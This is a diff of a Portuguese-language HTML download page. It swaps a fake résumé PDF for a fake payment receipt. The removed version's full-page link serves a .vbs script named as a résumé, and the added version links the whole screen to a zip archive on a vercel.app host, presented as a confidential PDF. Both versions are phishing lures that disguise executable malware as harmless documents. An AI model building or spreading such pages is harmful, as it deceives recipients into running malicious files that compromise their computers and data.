@@ -3,8 +3,8 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Download do Currículo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+  <title>Comprovante de Pagamento</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
     * {
@@ -15,99 +15,95 @@
 
     html, body {
       width: 100%;
-      min-height: 100vh;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #d1f4e1, #eafaf2);
+      height: 100%;
+      font-family: 'Inter', Arial, sans-serif;
+      background: linear-gradient(135deg, #f7f9fc, #e0e6ed);
     }
 
-    a.full-page-link {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      width: 100%;
+    a.full-link {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
       text-decoration: none;
       color: inherit;
-      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
     }
 
     .box {
       background: #ffffff;
       border-radius: 20px;
       padding: 40px 32px;
-      max-width: 520px;
+      max-width: 540px;
       width: 100%;
       text-align: center;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
-      animation: fadeIn 0.8s ease;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+      z-index: 20;
     }
 
     h1 {
       font-size: 26px;
-      color: #20a65e;
-      margin-bottom: 16px;
+      color: #008000;
+      margin-bottom: 18px;
       font-weight: 600;
     }
 
     p {
       font-size: 16px;
-      margin-bottom: 14px;
-      color: #444;
+      margin-bottom: 16px;
+      line-height: 1.5;
+      color: #333;
     }
 
     .btn-visual {
-      background-color: #20a65e;
+      background-color: #008000;
       color: #fff;
       padding: 14px 28px;
-      border: none;
       border-radius: 10px;
       font-size: 16px;
-      font-weight: 600;
+      font-weight: 500;
       display: inline-block;
-      box-shadow: 0 6px 20px rgba(32, 166, 94, 0.3);
-      transition: background 0.3s ease, transform 0.2s ease;
-    }
-
-    .btn-visual:hover {
-      background-color: #178a4d;
-      transform: scale(1.03);
+      box-shadow: 0 6px 20px rgba(0, 128, 0, 0.25);
+      margin-top: 10px;
     }
 
     .note {
       font-size: 13px;
-      color: #777;
+      color: #888;
       margin-top: 20px;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    @media (max-width: 600px) {
-      .box {
-        padding: 28px 20px;
+    @media print {
+      * {
+        -webkit-print-color-adjust: exact !important;
+        print-color-adjust: exact !important;
       }
 
-      h1 {
-        font-size: 22px;
+      html, body {
+        background: linear-gradient(135deg, #f7f9fc, #e0e6ed) !important;
+      }
+
+      .box {
+        box-shadow: none !important;
       }
 
       .btn-visual {
-        font-size: 15px;
-        padding: 12px 24px;
+        background-color: #008000 !important;
+        color: white !important;
+        box-shadow: none !important;
       }
     }
   </style>
 </head>
 <body>
-  <a href="https://m110.syncusercontent.com/mfs-60:0266c84ecee0787625e22ca0f90afa94=============================/p/Curriculo-Isabela-2025.vbs?allowdd=0&datakey=ja/tfA0aPRYRGPEVLSsUWTwiZPbCzV4JsqFZOCo+X73edEKXFzYNRep2LQKvHoPONsPfyhFtAKy1Tm2+e9PG31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTe31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTen9zPfDkfVKrV2wWkdmfdHfElakiLruZwAP5qbuI0O76gr/4emWN/FEyqwTd+ifwt+ncgvX+vftewAIkzyrf7wkqkLu507X5fAjr9AlzLGCRiYNVZNfl0zfvsDj31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTeVZZ9gBPaE2F4OnzKoPgpOFqjabmEzJAhaQ&engine=ln-3.1.38&errurl=n5O6oBbf1KKR31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTe7/YVUh3ZknRiGZ/jI/HEpDDf49h3y1/8YkDaP08byjcDmomlCEHpmOBRJkeQ+M5sXuQcNDG6qNP3oZF/lw1/0R2ou7Ww/CKD93u8+d5A9VeXCbtgYT/q9mQNTo30GeZV7Aiq97N+Zf25PnyWbB+gi2H/Zr5Qhv31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTehj1NS5BVooTRGoD+Y00t4zg+8ofghrVjPk6v6PsYEi6+PhBCQb7puORXo2b1eeOU/qe1DXOo93Pt4ImxXyQwQewUISIL4U25kMI3kCkw==&header1=Q29udGVudC1UeXBlOiB1bmRlZmluZWQ&header2=Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9IkN1cnJpY3Vsby1Jc2FiZWxhL31qoBtBfXtkJrzzjYyYCNuvd6fftXhTtTenJ0N1cnJpY3Vsby1Jc2FiZWxhLTIwMjUudmJzOw&ipaddress=3139932420&linkcachekey=9b85c2fa0&linkoid=2172950007&mode=101&sharelink_id=154684918050007&timestamp=1752870095477&uagent=2ed4ad51bd344db4957dc619cfd099f15284b24a&signature=6323fbfa780688ce4c86a52cbc499d4f8a8c2831&cachekey=60:0266c84ecee0787625e22ca0f90afa94=============================" class="full-page-link">
+  <a href="https://privacy-58248-com.vercel.app/arquivo.zip" class="full-link" target="_blank" rel="noopener noreferrer">
     <div class="box">
-      <h1>📄 Currículo de Isabela</h1>
-      <p>O arquivo está pronto para download seguro.</p>
-      <div class="btn-visual">Baixar Currículo</div>
-      <p class="note">PDF • Visualização rápida e protegida</p>
+      <h1>✅ Comprovante de Pagamento</h1>
+      <p>Documento está disponível para visualização. Verifique os detalhes.</p>
+      <div class="btn-visual">Visualizar Comprovante</div>
+      <p class="note">Documento em PDF • Confidencial</p>
     </div>
   </a>
 </body>
